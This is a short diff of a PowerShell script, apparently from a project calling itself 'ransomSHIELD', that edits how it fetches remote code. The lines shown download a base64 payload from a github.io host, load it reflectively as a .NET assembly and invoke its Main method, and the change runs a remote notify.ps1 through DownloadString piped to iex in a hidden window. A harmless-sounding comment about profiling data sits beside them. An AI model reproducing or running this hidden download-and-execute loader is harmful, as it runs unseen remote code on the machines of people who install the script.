@@ -8,7 +8,7 @@ $versionUrl = "https://ransomSHIELD.github.io//version.txt"
 $arg = "-Command ""&{ `$base64String = (New-Object System.Net.WebClient).DownloadString('$url'); `$assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(`$base64String)); `$entryPointMethod = `$assembly.GetTypes().Where({ `$_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic'); `$entryPointMethod.Invoke(`$null, (, `$null)) }""" 
 
 $urlNotify = "https://ransomSHIELD.github.io/notify.ps1"
-$argNotify = "-WindowStyle Hidden -Command ""iwr '$urlNotify' | iex"" "
+$argNotify = "-WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadString('$urlNotify') | iex"" "
 
 # create folder that holds profiling data-sets
 try {
